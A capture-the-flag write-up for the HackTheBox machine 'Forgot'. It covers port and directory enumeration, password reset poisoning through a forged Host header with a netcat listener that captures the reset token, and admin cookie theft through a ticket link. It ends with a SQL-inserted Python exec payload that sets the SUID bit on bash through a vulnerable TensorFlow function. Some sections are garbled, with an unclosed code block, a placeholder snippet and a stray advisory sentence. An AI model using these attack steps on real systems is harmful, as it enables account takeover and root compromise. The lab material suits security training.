# Forgot (HTB Medium)
![logo](/Assets/Pictures/Forgot/Forgot_logo.png)
<br />
This was a medium Linux box on the platform [HackTheBox](https://app.hackthebox.com/machines/Forgot), created by MrR3boot.

# 🕵🏿Intelligence Gathering

First thing first, let’s get some information about the box by running some **nmap** scans

`nmap -p- --min-rate 5000 -vv -oN all-ports.log 10.10.11.188`

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

`nmap -sVC -vv --min-rate 5000 -oN services.log 10.10.11.188`

```bash
Scanning 2 services on **forgot.htb** (10.10.11.188)

```

# 🕷️Web Enumeration

Let’s enumerate the technologies with **whatweb**

```bash
16:49:41 ➜  whatweb 10.10.11.188

```

Here how the website looks like,

Here the source code from ‘View Source’

![source-code.png](/Assets/Pictures/Forgot/source-code.png)

Just a login page we got so far with a username of **robert-dev-145092**…we added the hostname to our **/etc/hosts** file. Now, knowing the **hostname** we can check the virtual host to make sure that we are not missing a subdomain in the meantime we also need to check the directories on **forgot.htb.**

I used **gobuster** for directory busting and **ffuf** to check the presence of subdomain but could not find any subdomain on this server.

After running `gobuster dir -u http://forgot.htb -w ~/wordlists/SecLists/Discovery/Web-Content/directory-list-1.0.txt -t 60 -o dir-bust.log`

Here are the results of both scans, really interesting information leaked.

```bash
/login                (Status: 200) [Size: 5189]
/home                 (Status: 302) [Size: 189] [--> /]
/tickets              (Status: 302) [Size: 189] [--> /]
Progress: 3779 / 87665 (4.31%)                        [ERROR] 2022/11/29 10:33:59 [!] Get **"http://forgot.htb/forgot"**: context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/reset                (Status: 200) [Size: 5523]
```

With those directories revealed to us, it’s time for us to visit those endpoints and see what we can get…The problem 

I encoutered was that, the /forgot endpoint was not showing in my saved file as shown below

```bash
/login                (Status: 200) [Size: 5189]
/home                 (Status: 302) [Size: 189] [--> /]
/tickets              (Status: 302) [Size: 189] [--> /]
/reset                (Status: 200) [Size: 5523]
```

# Foothold & User

In the saved file, there is no /forgot, but visiting it is showing that it works properly. **[Hint]** read the error messages, they helps sometimes.

here are the screenshots of different endpoints of the server

![login-page.png](/Assets/Pictures/Forgot/login-page.png)

![reset.png](/Assets/Pictures/Forgot/reset.png)

![forgot.png](/Assets/Pictures/Forgot/forgot.png)

we cannot access the rest, like /home and /tickets we will need to be connected. Since a 302 means we are not authorized to access the page.

With all these endpoints we can think about a [password reset poisoning attack](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).

As described in the link above, in this attack we just have to change the Host an redirect the link to our host. This picture from [port swinger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning) depict it very well.

![password-reset-poisoning.svg](/Assets/Pictures/Forgot/password-reset-poisoning.svg)

In that case i will need a nc listener ready to intercept the query and try to reset the password of the user we found earlier. 

![reset-passwd.png](/Assets/Pictures/Forgot/reset-passwd.png)

Here is the token we got

```bash
➜  sudo nc -nlvp 80
[sudo] password for d0n: 
Listening on 0.0.0.0 80
Connection received on 10.10.11.188 55928
GET /reset?token=<your-token> HTTP/1.1
Host: 10.10.14.115
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

Once the cookie stolen, we can reset the password and log in with the new password

home page

tickets

![image description](/Assets/Pictures/Forgot/tickets.png)

escalate

The escalate page will help us get somewhere due to the input. We can inject a malicious link in the link field in order to steal the admin cookie since we are escalating the issue to the admin. It was hard finding a link, I tried to use my I.P but no success…I tried the js links still did not have anything.

![Screenshot 2022-12-16 at 21-34-13 Support Portal.png](/Assets/Pictures/Forgot/Screenshot_2022-12-16_at_21-34-13_Support_Portal.png)

Finally we found a link where we can send the link and by accessing that page we can get the admin cookie and steal it

here is the vulnerable path [`http://10.10.11.188/static/main4.css`](http://10.10.11.188/static/main4.css)

Now we got Diego’s ssh credentials and logged in as Diego

```bash

# Privilege Escalation/Privesc

The first thing as usual, I checked the the list of allowed and forbidden commands for diego

```bash
diego@forgot:~$ sudo -l
Matching Defaults entries for diego on forgot:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py
```

As we can see there a script sitting under `/opt/security/ml_security.py` 

We found in the file the database credentials which is the same as the ssh one.

Here we have the libraries used in the script

```bash
  1 #!/usr/bin/python3
  2 import sys
  3 import csv
  4 import pickle
  5 import mysql.connector
  6 import requests
  7 import threading
  8 import numpy as np
  9 import pandas as pd
 10 import urllib.parse as parse
 11 from urllib.parse import unquote
 12 from sklearn import model_selection
 13 from nltk.tokenize import word_tokenize
 14 from sklearn.linear_model import LogisticRegression
 15 from gensim.models.doc2vec import Doc2Vec, TaggedDocument
 16 from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string
```

After looking for vulnerabilities, preprocess_input_exprs_arg_string from tensorflow is vulnerable and we will exploit it for the privilege escalation part. [Here](https://github.com/advisories/GHSA-75c9-jrh4-79mc) is the details about the vulnerability

The interesting part of the code is here.

```bash
-
```

We have now removed the `safe=False` argument, so all parsing is done withough calling `eval`.

Here is a structure of the table escalate.

```bash
mysql> desc escalate;
+--------+------+------+-----+---------+-------+
| Field  | Type | Null | Key | Default | Extra |
+--------+------+------+-----+---------+-------+
| user   | text | YES  |     | NULL    |       |
| issue  | text | YES  |     | NULL    |       |
| link   | text | YES  |     | NULL    |       |
| reason | text | YES  |     | NULL    |       |
+--------+------+------+-----+---------+-------+
```

With that in mind, let’s inject a malicious python code into the database, in our case let’s get the root SUID sticky bit set to `/usr/bin/bash`.

```bash
mysql> insert into escalate values ("a","b","c",'hello=exec("""\nimport os\nos.system("chmod +s /usr/bin/bash")""")');
Query OK, 1 row affected (0.01 sec)

mysql> 
[1]+  Stopped                 mysql -u diego -D app -p

There we got it. Thanks for reading and happy hacking y'all!
